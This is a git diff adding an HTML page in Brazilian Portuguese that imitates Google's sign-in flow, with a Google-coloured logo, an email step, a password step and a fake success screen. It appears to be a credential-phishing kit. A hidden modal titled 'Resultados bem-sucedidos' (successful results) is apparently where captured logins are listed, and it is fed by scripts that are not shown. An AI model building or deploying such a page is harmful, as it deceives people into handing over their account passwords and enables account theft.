@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Faça login</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- TELA 1: E-mail -->
+  <div class="screen" id="screen-email">
+    <div class="card">
+      <div class="card-left">
+        <div class="logo">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <rect width="18" height="18" rx="2" fill="#4285F4"/>
+            <rect x="22" width="18" height="18" rx="2" fill="#EA4335"/>
+            <rect y="22" width="18" height="18" rx="2" fill="#34A853"/>
+            <rect x="22" y="22" width="18" height="18" rx="2" fill="#FBBC05"/>
+          </svg>
+        </div>
+        <h1>Faça login</h1>
+        <p class="subtitle">Use sua Conta do Google</p>
+      </div>
+      <div class="card-right">
+        <div class="input-group">
+          <input type="text" id="email-input" class="input-field" placeholder=" " autocomplete="off"/>
+          <label class="input-label">E-mail ou telefone</label>
+        </div>
+        <p id="email-error" class="error-msg hidden">Endereço de e-mail não encontrado.</p>
+        <a href="#" class="link-text">Esqueceu o e-mail?</a>
+        <p class="info-text">
+          Não está no seu computador? Use o modo visitante para fazer login com privacidade.
+          <a href="#" class="link-text inline">Saiba como usar o modo visitante.</a>
+        </p>
+        <div class="btn-row">
+          <button class="btn-ghost">Criar conta</button>
+          <button class="btn-primary" onclick="goToPassword()">Avançar</button>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-left">
+        <span>Português (Brasil)</span>
+        <svg width="12" height="8" viewBox="0 0 12 8" fill="none"><path d="M1 1L6 6L11 1" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/></svg>
+      </div>
+      <div class="footer-links">
+        <a href="#">Ajuda</a>
+        <a href="#">Privacidade</a>
+        <a href="#">Termos</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- TELA 2: Senha -->
+  <div class="screen hidden" id="screen-password">
+    <div class="card">
+      <div class="card-left">
+        <div class="logo">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <rect width="18" height="18" rx="2" fill="#4285F4"/>
+            <rect x="22" width="18" height="18" rx="2" fill="#EA4335"/>
+            <rect y="22" width="18" height="18" rx="2" fill="#34A853"/>
+            <rect x="22" y="22" width="18" height="18" rx="2" fill="#FBBC05"/>
+          </svg>
+        </div>
+        <h1>Olá!</h1>
+        <div class="user-chip">
+          <div class="user-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+          </div>
+          <span id="display-email">email@gmail.com</span>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+      </div>
+      <div class="card-right">
+        <div class="input-group focused">
+          <input type="password" id="password-input" class="input-field" placeholder=" " autocomplete="off"/>
+          <label class="input-label active">Digite sua senha</label>
+        </div>
+        <div class="checkbox-row">
+          <input type="checkbox" id="show-pass" onchange="togglePassword()"/>
+          <label for="show-pass">Mostrar senha</label>
+        </div>
+        <p id="pass-error" class="error-msg hidden">Senha incorreta. Tente novamente.</p>
+        <div class="btn-row">
+          <button class="btn-ghost" onclick="goBack()">Tentar de outro jeito</button>
+          <button class="btn-primary" onclick="doLogin()">Avançar</button>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-left">
+        <span>Português (Brasil)</span>
+        <svg width="12" height="8" viewBox="0 0 12 8" fill="none"><path d="M1 1L6 6L11 1" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/></svg>
+      </div>
+      <div class="footer-links">
+        <a href="#">Ajuda</a>
+        <a href="#">Privacidade</a>
+        <a href="#">Termos</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- TELA 3: Sucesso -->
+  <div class="screen hidden" id="screen-success">
+    <div class="card card-centered">
+      <div class="success-icon">✓</div>
+      <h2>Login realizado com sucesso!</h2>
+      <p id="success-msg">Bem-vindo de volta.</p>
+      <button class="btn-primary" style="margin-top:24px" onclick="restart()">Sair</button>
+    </div>
+  </div>
+
+  <!-- MODAL: Painel de resultados -->
+  <div class="modal-overlay hidden" id="modal-resultados" onclick="fecharPainelFora(event)">
+    <div class="modal-painel">
+      <div class="modal-header">
+        <span class="modal-titulo">Resultados bem-sucedidos</span>
+        <button class="modal-fechar" onclick="fecharPainel()">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="modal-body" id="modal-lista"></div>
+    </div>
+  </div>
+
+  <script src="db.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
